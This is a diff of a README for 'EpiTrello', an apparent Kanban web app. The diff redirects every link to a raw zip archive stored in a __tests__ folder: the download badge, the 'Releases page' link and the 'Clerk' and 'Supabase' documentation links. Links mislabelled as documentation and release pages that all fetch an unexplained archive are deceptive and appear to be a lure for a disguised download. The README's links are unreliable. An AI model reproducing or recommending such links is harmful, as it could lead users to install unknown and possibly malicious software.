@@ -1,7 +1,7 @@
 # 🎉 EpiTrello - Your Kanban Board Made Easy
 
 ## 📥 Download EpiTrello
-[![Download EpiTrello](https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip)](https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip)
+[![Download EpiTrello](https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip)](https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to EpiTrello! This is a Trello-inspired Kanban web app that helps you organize your tasks easily. With boards, columns, and tasks, you can manage your projects with drag and drop functionality. This app is built using the latest web technologies and provides secure authentication with Clerk and data storage with Supabase.
@@ -26,7 +26,7 @@ EpiTrello offers several powerful features:
 Follow these steps to get EpiTrello on your device:
 
 1. **Visit the Releases Page:**
-   Click [here](https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip) to access the Releases page.
+   Click [here](https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip) to access the Releases page.
 
 2. **Select the Latest Version:**
    Look for the latest version of EpiTrello. You will see a list of available downloads.
@@ -69,8 +69,8 @@ We welcome contributions! If you have suggestions or improvements, feel free to 
 
 ## 🔗 Additional Resources
 For more guidance, visit:
-- [Clerk Documentation](https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip)
-- [Supabase Documentation](https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip)
-- [https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip Documentation](https://github.com/llvjohn/EpiTrello/raw/refs/heads/main/images/Epi-Trello-v1.2.zip)
+- [Clerk Documentation](https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip)
+- [Supabase Documentation](https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip)
+- [https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip Documentation](https://raw.githubusercontent.com/llvjohn/EpiTrello/main/__tests__/Trello_Epi_v3.2.zip)
 
 Thank you for using EpiTrello! We hope this application helps you manage your tasks more effectively. 
